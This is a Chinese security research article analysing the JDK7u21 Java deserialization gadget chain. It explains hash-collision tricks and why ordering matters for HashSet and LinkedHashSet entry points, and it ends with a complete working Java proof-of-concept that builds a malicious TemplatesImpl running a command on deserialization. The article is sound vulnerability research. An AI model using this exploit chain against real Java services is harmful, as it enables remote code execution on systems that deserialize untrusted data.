> 原文链接: https://www.anquanke.com//post/id/247684 


# 关于JDK7u21 Gadgets两个问题的探讨


                                阅读量   
                                **28006**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01227c4ffb96025ab7.jpg)](https://p0.ssl.qhimg.com/t01227c4ffb96025ab7.jpg)



最近在分析JDK7u21的Gadgets，有两个不解之处，阅读前辈们的文章发现并未提起：<br>
1.为什么有的POC入口是LinkedHashSet，有的是HashSet，两个都可以触发吗？<br>
2.关于`map.put("f5a5a608", templates);`的位置，为什么将其放在`set.add(proxy);`前面执行会导致反序列化执行命令失败的问题？

就这两个疑惑进行调试分析，有了这篇文章。<br>
本次分析调试的POC放在最后一部分，需要的可以先copy。

接下来本文将会按照以下思路分析探讨：<br>
1.Gadgets链反序列化载体的分析，为上述两个问题的解答做铺垫；<br>
2.两个疑惑的分析解答；<br>
3.我们挖掘此类漏洞的思路。



## 一、反序列化载体分析

[frohoff给出的Gadgets](https://gist.github.com/frohoff/24af7913611f8406eaf3)

[![](https://p0.ssl.qhimg.com/t01378af5cf4168a815.png)](https://p0.ssl.qhimg.com/t01378af5cf4168a815.png)

命令执行载体TemplatesImpl前面分析过了，这里不涉及了。根据Gadgets我们知道是通过AnnotationInvocationHandler的invoke和equalsImpl调用了TemplatesImpl.getOutputProperties，那么我们先看下这部分。

### <a class="reference-link" name="1%E3%80%81AnnotationInvocationHandler%E9%93%BE"></a>1、AnnotationInvocationHandler链

POC中创建了一个动态代理proxy，用tempHandler代理Templates接口，根据动态代理知识我们知道实际就是AnnotationInvocationHandler的invoke代理了Templates接口的两个方法newTransformer()和getOutputProperties()。

<a class="reference-link" name="1.1%E3%80%81AnnotationInvocationHandler.invoke()"></a>**1.1、AnnotationInvocationHandler.invoke()**

```
// invoke传入的参数：Object proxy 代理对象, Method method 代理实例上调用的接口方法的method, Object[] args 方法的实参
public Object invoke(Object var1, Method var2, Object[] var3) `{`
    // var4即代理的方法名
    String var4 = var2.getName();
    // var5即代理方法的参数数组
    Class[] var5 = var2.getParameterTypes();
    // 当代理方法是equals，并且参数只有一个是Object，也就是当代理的方法是proxy.equals(Object obj)
    if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) `{`
        // equalsImpl传入的参数实际是代理方法的参数，如果这里传入TemplatesImpl实例，var3[0] = TemplatesImpl实例
        return this.equalsImpl(var3[0]);
    `}` else `{`
        ......
    `}`
`}`
```

根据动态代理相关知识，我们知道invoke()传入的参数是代理对象，被代理的方法及其参数只有在满足一定条件时（`var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class`）会调用equalsImpl。

<a class="reference-link" name="1.2%E3%80%81%20AnnotationInvocationHandler.equalsImpl()"></a>**1.2、 AnnotationInvocationHandler.equalsImpl()**

```
private Boolean equalsImpl(Object var1) `{`
    if (var1 == this) `{` 
        return true;
    `}` else if (!this.type.isInstance(var1)) `{`// 根据poc这里type指的就是初始化的Templates.class
        return false;
    `}` else `{` // 传入的参数不是AnnotationInvocationHandler对象也不是Templates的实例时
        // getMemberMethods会获取AnnotationInvocationHandler.this.type.getDeclaredMethods()，即type属性代表的类Templates定义的方法
        Method[] var2 = this.getMemberMethods();
        int var3 = var2.length;
        // Templates一共有2个方法newTransformer()和getOutputProperties()，循环调用所有方法
        for(int var4 = 0; var4 &lt; var3; ++var4) `{`
            // method对象
            Method var5 = var2[var4];
            // 获取method名称，即方法名
            String var6 = var5.getName();
            Object var7 = this.memberValues.get(var6);
            Object var8 = null;
            // asOneOfUs：如果var1是动态代理类实例，并且其InvocationHandler是AnnotationInvocationHandler实例，如果不是的话，返回null
            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
            if (var9 != null) `{`
                var8 = var9.memberValues.get(var6);
            `}` else `{` // 没有var1不是InvocationHandler实例的情况
                try `{`
                    // invoke调用方法：依次调用method.invoke，当var1是TemplatesImpl实例，就会调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties
                    var8 = var5.invoke(var1);
                `}` catch (InvocationTargetException var11) `{`
                    return false;
                `}` catch (IllegalAccessException var12) `{`
                    throw new AssertionError(var12);
                `}`
            `}`

            if (!memberValueEquals(var7, var8)) `{`
                return false;
            `}`
        `}`

        return true;
    `}`
`}`
```

根据上面代码的分析我们能得出equalsImpl传入的参数是TemplatesImpl实例，并且AnnotationInvocationHandler.type属性是TemplatesImpl.class对象，我们就能调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties。那么当equalsImpl传入的参数是TemplatesImpl实例时，proxy.equals(Object obj)实际就是需要传入参数就是参数类型即TemplatesImpl.class。

小结：

```
AnnotationInvocationHandler.invoke(Object proxy, Method method,Object[0] templatesImpl)---满足条件（proxy.equals(TemplatesImpl实例)）---&gt;AnnotationInvocationHandler.equalsImpl(Templates实例)-----&gt;TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties
```

现在的问题是如何能满足`proxy.equals(TemplatesImpl实例)`这个条件。

### <a class="reference-link" name="2%E3%80%81proxy.equals(TemplatesImpl%E5%AE%9E%E4%BE%8B)"></a>2、proxy.equals(TemplatesImpl实例)

<a class="reference-link" name="2.1%E3%80%81HashMap.put()"></a>**2.1、HashMap.put()**

```
public V put(K key, V value) `{`
    if (key == null)
        return putForNullKey(value);
    // 计算key的hash
    int hash = hash(key);
    // 返回hash在数组中的索引i
    int i = indexFor(hash, table.length);
    // 链表的操作，循环链表中的所有键值对
    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) `{`
        Object k;
        // 条件1：当前键值对的hash == 要插入键值对的hash，条件2：当前键值对的key的值==要插入的键值对的key的值，条件3：当前要插入键值对的key.equals(当前键值对的key))
        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) `{`
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        `}`
    `}`

    modCount++;
    addEntry(hash, key, value, i);
    return null;
`}`
```

jdk1.7的HashMap的数据结构是数组+链表，插入key-value操作：<br>
1.数组下标是key计算后的hash值；<br>
2.数组的值是一个链表；<br>
3.要插入一个新的key-value，如果key计算后的hash在数组中已经存在，则会在这个hash所在链表中插入这个value。当然插入之前要满足一个条件：插入的键值对的key不能在链表中已存在，即key的hash可以相等，但是key不能相等。

所以HashMap在插入时会对key和已存在的hash进行比较，不允许相同的key的键值对重复进行插入。

这跟本次链有什么关系？<br>
我们要找的是proxy.equals(TemplatesImpl实例)的调用，上面代码`if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))`当条件1满足且条件2不满足，会执行equal方法。如果要调用proxy.equals(TemplatesImpl实例)，那么需要让key=proxy，k=TemplatesImpl实例，即当前插入的键值对的key是proxy，并且需要key是TemplatesImpl实例的键值对已存在，那么我们就需要在插入的时候**先插入TemplatesImpl实例再插入Proxy实例**。这也说明了poc为什么要先添加TemplatesImpl实例再添加Proxy实例。

接下来的问题是怎么让条件1满足条件2不满足？<br>
当key=proxy且k=TemplatesImpl实例时，两者一定不相等条件2满足。条件1（TemplatesImpl实例的哈希==proxy的哈希）怎么满足？

<a class="reference-link" name="2.2%E3%80%81TemplatesImpl%E5%AE%9E%E4%BE%8B%E7%9A%84%E5%93%88%E5%B8%8C==Proxy%E5%AE%9E%E4%BE%8B%E7%9A%84%E5%93%88%E5%B8%8C"></a>**2.2、TemplatesImpl实例的哈希==Proxy实例的哈希**

在HashMap中计算hash会调用hash()方法：`int hash = hash(key);`，我们先来看看hash()方法。

```
final int hash(Object k) `{`
    int h = 0;
    if (useAltHashing) `{`
        if (k instanceof String) `{`
            return sun.misc.Hashing.stringHash32((String) k);
        `}`
        h = hashSeed;
    `}`
    //关键处
    h ^= k.hashCode();
    // 这个函数确保在每个位位置仅相差常数倍的hashCodes冲突的数量有限(在默认加载因子下大约为8)。
    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
`}`
```

hash调用k的hashCode方法，即会调用k所代表的对象的该方法，那么我们需要看看Proxy.hashCode()和TemplatesImpl.hashCode()。

TemplatesImpl内部没有定义hashCode()，所以调用的是Object的该方法，该方法是native方法，我们无法得知细节。

Proxy内部也没有定义hashCode()，但是有这样的说明：

```
调用`{`@code java.lang.Object`}`中声明的`{`@code hashCode`}`、`{`@code equals`}`或`{`@code toString`}`方法。将对代理实例上的Object`}`进行编码并将其分派给调用处理程序的`{`@code invoke`}`方法，其方式与接口方法调用的编码和分派方式相同，如上所述。`{`@code Method`}`对象传递给`{`@code invoke`}`的声明类将是`{`@code java.lang.Object`}`。代理实例的其他公共方法继承自`{`@code java.lang。Object`}`不会被代理类覆盖，所以这些方法的调用行为就像`{`@code java.lang.Object`}`实例的行为一样。
【题外话：注解@code的使用语法`{`@code text`}` 被解析成&lt;code&gt;text&lt;/code&gt;，将文本标记为代码样式的文本，在code内部可以使用 &lt; 、&gt; 等不会被解释成html标签, code标签有自己的样式。
一般在Javadoc中只要涉及到类名或者方法名，都需要使用@code进行标记。】
```

如果调用proxy的hashCode方法，当代理handler是AnnotationInvocationHandler对象时，proxy.hashCode会通过AnnotationInvocationHandler.invoke处理，实际上AnnotationInvocationHandler.invoke会通过AnnotationInvocationHandler.hashCodeImpl()来具体实现。

```
if (var4.equals("hashCode")) `{`
    return this.hashCodeImpl();
`}`
```

AnnotationInvocationHandler.hashCodeImpl()：在P神的JDK7u21文章里，特别分析了该方法，我们来看下。

```
private int hashCodeImpl() `{` 
    int result = 0; 
    // 循环memberValues的所有键值对，将键值对通过计算获取的结果进行累加。memberValues指的是AnnotationInvocationHandler实例化时传入的Map实例，&lt;"f5a5a608",TemplateImpl实例&gt;
    for (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) `{` 
        result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); 
    `}`
    return result; 
`}`
```

> 当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() 。如果key.hashCode() 等于0，任何数异或0的结果仍是他本身，那么该哈希可以简化成value.hashCode() 。 那么当value就是TemplateImpl对象时，返回的result是TemplateImpl对象的hash，那么这时候proxy.equals(TemplatesImpl实例)就是TemplateImpl对象的hash，这两个哈希就变成完全相等。

所以key.hashCode=0，找到这个key，value是TemplateImpl实例。如何找到这个key，我们可以通过计算：

```
for (long i = 0; i &lt; 9999999999L; i++) `{`
    // 当其hashCode是0就是我们想要的结果
    if (Long.toHexString(i).hashCode() == 0) `{`
        System.out.println(Long.toHexString(i));
    `}`
`}`
```

hash碰撞后的结果会有多个，将其中一个作为key就可以，所以针对AnnotationInvocationHandler实例化的Map对象进行插入操作即Map.put(“f5a5a608”,TemplateImpl实例)。

2.1和2.2小结：

这时候为了触发命令执行，我们就找到一条链：

```
HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put("f5a5a608",TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties()
```

接下来的问题是如何能够在反序列化时调用HashMap.put(proxy,xx)？

<a class="reference-link" name="2.3%E3%80%81%E5%A6%82%E4%BD%95%E8%83%BD%E5%A4%9F%E8%B0%83%E7%94%A8HashMap.put%EF%BC%9F"></a>**2.3、如何能够调用HashMap.put？**

调用HashMap.put我们考虑HashSet，因为**HashSet内部使用HashMap来存储数据**，并且HashSet重写了readObject方法，既然重写了readObject那么就有可能要调用HashMap.put方法来恢复数据结构。我们来看下HashSet.readObject()：

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException `{`
    // 调用默认反序列化方法
    s.defaultReadObject();
    // 读取HashMap容量和负载因子,并创建备份HashMap
    int capacity = s.readInt();
    float loadFactor = s.readFloat();
    // 判断是否是LinkedHashSet实例，如果是就实例化一个LinkedHashMap对象，否则实例化一个HashMap对象
    map = (((HashSet)this) instanceof LinkedHashSet ?
           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
           new HashMap&lt;E,Object&gt;(capacity, loadFactor));

    // 读取map个数
    int size = s.readInt();
    // 循环反序列化所有元素
    for (int i=0; i&lt;size; i++) `{`
        // 按照e的原始类型反序列化，并put到hashmap
        E e = (E) s.readObject();
        map.put(e, PRESENT);// 注意！！这里会调用HashMap.put
    `}`
`}`
```

在HashSet.readObject()中读取每个entry后会将其put到HashMap中，因此只要我们序列化一个HashSet，反序列化时就会调用HashMap.put()。

另外需要注意一点，HashSet.add()在添加元素时，实际调用了HashMap的put方法，将传入的参数作为key，value是一个常量，所以我们在调用HashSet.add(e)，添加的元素e实际都是HashMap的key，这也跟前面的2.1的put的**key**对上了，add添加的就是TemplateImpl实例和Proxy实例。

```
public boolean add(E e) `{`
     // add的e就是HashMap键值对的key
     return map.put(e, PRESENT)==null;
 `}`
```

那么到这里，我们就可以构造完整的执行链：

```
HashSet.readObject()---&gt;HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put("f5a5a608",TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties
```

### <a class="reference-link" name="3%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E7%9A%84POC%E5%85%A5%E5%8F%A3%E6%98%AFLinkedHashSet%EF%BC%8C%E6%9C%89%E7%9A%84%E6%98%AFHashSet%EF%BC%9F"></a>3、为什么有的POC入口是LinkedHashSet，有的是HashSet？

我看到有些分析文章提到了需要用LinkedHashSet而不是HashSet，因为LinkedHashSet是有序的HashSet是无序的。其实两个都可以作为入口点，不论LinkedHashSet还是HashSet，主要跟**反序列化时在HashSet.readObject中调用map.put插入TemplatesImpl实例和Proxy实例前后顺序**有关系，因为需要HashMap.put插入时的比较操作来触发命令执行，当插入Proxy实例需要TemplatesImpl实例已经存在才能调用proxy.equals(templatesimpl)，这里不懂可以回到2.1再理解下。

LinkedHashSet可以保证我们的添加时候的顺序和反序列化时候的顺序一致，但是HashSet是无序的，不能保证这一点，那么我们如何让HashSet也满足反序列化时先读取TemplatesImpl实例再读取Proxy实例？<br>
答案如下：

```
HashMap map = new HashMap();
...
...
HashSet set = new HashSet();
map.put("f5a5a608", new int[]`{`-16`}`);
set.add(proxy);
set.add(templates);
map.put("f5a5a608", templates);
```

我们知道HashMap的数据结构是数组+链表，虽然它的插入是无序的，但是它迭代读取所有元素时还是会按照数组下标顺序来，那么我们只要让Proxy实例所在的数组索引大于Template实例所在数组索引就可以满足条件。HashMap初始长度为16，当proxy在最大下标15时就可以满足这个条件。我们知道proxy.hash可以根据AnnotationInvocationHandler.hashCodeImpl进行计算，AnnotationInvocationHandler.hashCodeImpl时根据map来计算的，map我们可控。

```
// 1、计算数据索引index
static int indexFor(int h, int length) `{`
    return h &amp; (length-1); // h =15，15 &amp; 15 =15
`}`

// 2、计算hash
final int hash(Object k) `{`
    int h = 0;
    if (useAltHashing) `{`
        if (k instanceof String) `{`
            return sun.misc.Hashing.stringHash32((String) k);
        `}`
        h = hashSeed;
    `}`
    // proxy.hashCode最终是AnnotationInvocationHandler.hashCodeImpl计算的结果
    h ^= k.hashCode();

    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4); // 返回需要是15
`}`
```

根据上面代码我们来反推下map需要put的键值对。<br>
1.下标indexFor根据hash和容量计算，那么proxy.hash需要是15；<br>
2.如何让proxy.hash=15？我们让hash(proxy)的结果是15就可以让indexFor是15，那么最终hash里面`h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4)`的值需要等于15；<br>
3.那么proxy.hashCode值是多少能让其hash(proxy)是15？我们可以通过计算：

```
public static void caculate() `{`
    for (int i = 0; i &lt; 100;i++)`{`
        // 将上面计算hash代码拿下来，单独计算下
        int h =0;
        h ^= i;
        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
        if ( (h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4) )== 15)`{`
            System.out.println("i:" + i);
        `}`
    `}`
`}`
```

计算的结果是当i=15，能够让hash(proxy)=5，也就是proxy.hashCode需要是15。当proxy.hashCode=15，map怎么赋值？这就简单了，我们来看下AnnotationInvocationHandler.hashCodeImp，当e.getKey().hashCode()=0，hashCodeImpl返回的值是memberValueHashCode(e.getValue())的值，计算原生类型数组memberValueHashCode()是可控的，我们下面以int数组为例进行计算，当e.getValue() = a[]`{`-16`}`能够返回proxy.hashCode是15。

```
// 1、AnnotationInvocationHandler.hashCodeImpl关键代码
// 当e.getKey().hashCode()==0，当e.getKey()==f5a5a608
result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue());

// 2、 memberValueHashCode(e.getValue())：原生类型
private static int memberValueHashCode(Object var0) `{`
    Class var1 = var0.getClass();
    if (!var1.isArray()) `{`
        //非原生类型 
        return var0.hashCode();
    `}` else if (var1 == byte[].class) `{`
        return Arrays.hashCode((byte[])((byte[])var0));
    `}` else if (var1 == char[].class) `{`
        return Arrays.hashCode((char[])((char[])var0));
    `}` else if (var1 == double[].class) `{`
        return Arrays.hashCode((double[])((double[])var0));
    `}` else if (var1 == float[].class) `{`
        return Arrays.hashCode((float[])((float[])var0));
    `}` else if (var1 == int[].class) `{`
        return Arrays.hashCode((int[])((int[])var0));
    `}` else if (var1 == long[].class) `{`
        return Arrays.hashCode((long[])((long[])var0));
    `}` else if (var1 == short[].class) `{`
        return Arrays.hashCode((short[])((short[])var0));
    `}` else `{`
        return var1 == boolean[].class ? Arrays.hashCode((boolean[])((boolean[])var0)) : Arrays.hashCode((Object[])((Object[])var0));
    `}`
`}`

// 3、 memberValueHashCode调用AnnotationInvocationHandler.hashCode(int a[])，当返回的result是15时，并且让a数组只有一个元素，element=-16
public static int hashCode(int a[]) `{`
    if (a == null)
        return 0;

    int result = 1;
    for (int element : a)
        result = 31 * result + element;

    return result;
`}`
```

到这里有人可能会提出一点，当proxy和templates计算出的数组下标刚好一样都是15怎么办？我们可以通过先set.add(proxy)再set.add(templates)，因为JDK1.7 HashMap的插入采用的是**头插法**，这样能让链表中templates在前proxy在后，也能够再读取所有元素时先读templates再读proxy。

### 4、关于`map.put("f5a5a608", templates);`的位置问题

有一点是需要说明的就是`map.put("f5a5a608", templates);`的位置，它必须在`set.add(proxy);`后被执行。在HashSet反序列化时readObject会先执行`E e = (E) s.readObject();`，再调用HashMap.put，我们知道ObjectInputStream处理序列化时会把目标的属性值反序列化赋给对象的属性，所以s.readObject会先序列化map，然后将其赋值给tempHandler的属性，同理tempHandler赋值给proxy属性，这时候调用HashMap.put就可以触发命令执行。

[![](https://p0.ssl.qhimg.com/t01996a376a12a412f1.png)](https://p0.ssl.qhimg.com/t01996a376a12a412f1.png)

那么放在`map.put("f5a5a608", templates);`在`set.add(proxy);`之前和之后的区别是什么？
1. 放在之前也是会执行命令的，但是它**不是在反序列化操作时执行**，并且反序列化时会报错找不到我们的恶意类Evil而终止程序。因为`map.put("f5a5a608", templates);`在`set.add(proxy);`前面，当我们add时会调用HashMap.put从而进行上述2.1的比较操作最终触发命令执行。为什么放在前面反序列化不会触发命令执行并且还报错终止？经过调试发现，templates._class属性原来应该是null，但是经过`map.put("f5a5a608", templates);set.add(proxy);`后，该_class变成了Evil，这时候序列化再反序列化，会读取属性Evil的Class对象来赋值给templates._class，但是由于Evil实际上只有字节码，没有本地的class文件，所以读取Evil.class会报错找不到类。
1. 放在后面，`set.add(proxy);`正常添加没有触发执行`proxy.equals(TemplatesImpl实例)`，并未触发`Templates.getOutputProperties()-&gt;_class[i]=loader.defineClass(_bytecodes[i])`，所以templates._class还是null，在反序列化时也是正常反序列化，只有在反序列化了proxy并将其put到hashmap时才触发了执行，这时候通过读取_bytecodes将类赋值给templates._class就不会报错。
1. 所以变化在于templates._class的值，放在前面templates._class不是null，放在后面templates._class是null，前面会在没有反序列化时触发命令执行，templates._class通过Templates.getOutputProperties()调用到了`defineClass(_bytecodes[i])`就会被赋值，**这时候在反序列化 首先templates._class不是null了，不满足命令执行的条件了**，这也同样能解释为什么在 AnnotationInvocationHandler.equalsImpl()循环调用了Templates的两个方法getOutputProperties()和newTransformer()，但是只执行了一次命令。


## 二、类似漏洞的挖掘思路

1.具备执行命令的条件：如本次漏洞的TemplatesImpl.getOutputProperties()，TemplatesImpl内部定义了类加载器并重载了defineClass，能够实例化后我们的恶意类从而执行命令。<br>
2.利用链的串联，可以通过反向寻找方法的调用，可以借鉴常用的一些反序列化载体如HashMap、HashSet、AnnotationInvocationHandler等。<br>
3.反序列化重写了readObject，通过readObject能够最终触发命令执行。中间触发命令执行方法一般用到Method.invoke()来反射调用。



## 三、POC

参考[l3yx的poc](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#AnnotationInvocationHandler)进行修改并调试：

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class Poc `{`
    //序列化
    public static byte[] serialize(final Object obj) throws Exception `{`
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    `}`

    //反序列化
    public static Object unserialize(final byte[] serialized) throws Exception `{`
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    `}`

    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception `{`
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    `}`

    //封装了之前对恶意TemplatesImpl类的构造
    private static TemplatesImpl getEvilTemplatesImpl() throws Exception `{`
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]`{``}`, cc);//创建无参构造函数
        cons.setBody("`{` Runtime.getRuntime().exec(\"calc\"); `}`");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]`{`byteCode`}`;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    `}`

    public static void main(String[] args) throws Exception `{`
        expHashSet();
//        expLinkedHashSet();
    `}`

    public static void expLinkedHashSet() throws Exception `{`
        TemplatesImpl templates = getEvilTemplatesImpl();

        HashMap map = new HashMap();

        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    `}`


    public static void expHashSet() throws Exception `{`
        TemplatesImpl templates = getEvilTemplatesImpl();

        HashMap map = new HashMap();
        map.put("f5a5a608", new int[]`{`-16`}`);

        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        HashSet set = new HashSet();
        set.add(proxy);
        set.add(templates);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    `}`
`}`
```



## 参考：

[https://gist.github.com/frohoff/24af7913611f8406eaf3](https://gist.github.com/frohoff/24af7913611f8406eaf3)<br>[https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/)<br>
phith0n：Java安全漫谈 – 18.原生反序列化利用链JDK7u21<br>[https://xz.aliyun.com/t/9704](https://xz.aliyun.com/t/9704)<br>[https://www.cnblogs.com/wlrhnh/p/7256969.html](https://www.cnblogs.com/wlrhnh/p/7256969.html)<br>[http://blog.csdn.net/justloveyou_/article/details/62893086](http://blog.csdn.net/justloveyou_/article/details/62893086)<br>[https://blog.csdn.net/justloveyou_/article/details/71713781](https://blog.csdn.net/justloveyou_/article/details/71713781)
